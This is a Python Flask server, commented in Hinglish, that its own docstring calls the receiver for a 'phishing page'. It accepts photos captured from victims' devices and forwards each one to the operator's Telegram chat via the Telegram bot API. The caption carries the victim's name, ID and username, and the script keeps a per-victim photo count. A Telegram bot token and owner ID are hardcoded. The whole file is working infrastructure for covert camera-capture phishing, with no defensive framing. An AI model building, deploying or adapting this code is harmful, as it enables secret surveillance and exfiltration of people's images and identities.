from flask import Flask, request
import requests, os, json
from datetime import datetime

app = Flask(__name__)

# ====== YAHAN APNA BOT TOKEN DAALO (bot.py wala hi) ======
BOT_TOKEN = "8736813237:AAGkNjqrnoJlyt7HcNrcKyowchaXkAfTRQo"

# ====== YAHAN APNI TELEGRAM ID DAALO ======
OWNER_ID = 8188215655

@app.route('/capture', methods=['POST'])
def capture():
    """Phishing page se image receive karta hai aur bot owner ko forward karta hai"""
    
    img_file = request.files.get('img')
    user_key = request.form.get('k', 'unknown')
    
    if not img_file:
        return "ok", 200
    
    # users.json file se user ki details nikaalo
    users = {}
    if os.path.exists('users.json'):
        with open('users.json') as f:
            users = json.load(f)
    
    # Kaun si user key hai ye dhundo
    user_info = "Unknown"
    user_chat_id = None
    
    for cid, data in users.items():
        if data.get('key') == user_key:
            user_info = f"{data['full']} (@{data['uname']})"
            user_chat_id = cid
            user_id = data.get('uid', '?')
            user_name = data.get('uname', '?')
            user_full = data.get('full', '?')
            
            # Photo count badhao
            data['pics'] = data.get('pics', 0) + 1
            with open('users.json', 'w') as f:
                json.dump(users, f, indent=2)
            break
    
    # Photo ko bot ke through owner ko bhejo
    photo_bytes = img_file.read()
    
    caption = (
        f"📸 PHOTO CAPTURED\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 Name: {user_full}\n"
        f"🆔 ID: {user_id}\n"
        f"📧 Username: @{user_name}\n"
        f"🔑 Key: {user_key}\n"
        f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━"
    )
    
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            files={'photo': ('capture.jpg', photo_bytes, 'image/jpeg')},
            data={
                'chat_id': OWNER_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            },
            timeout=30
        )
        print(f"✅ Photo sent for user: {user_info}")
    except Exception as e:
        print(f"❌ Error sending photo: {e}")
    
    return "ok", 200

@app.route('/health', methods=['GET'])
def health():
    return {"status": "ok", "time": datetime.now().isoformat()}

if __name__ == '__main__':
    print("🚀 Receiver Server Starting...")
    print(f"📁 users.json should be in same folder")
    # ⬇️ SIRF YEH 2 LINES CHANGE HUI HAIN
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
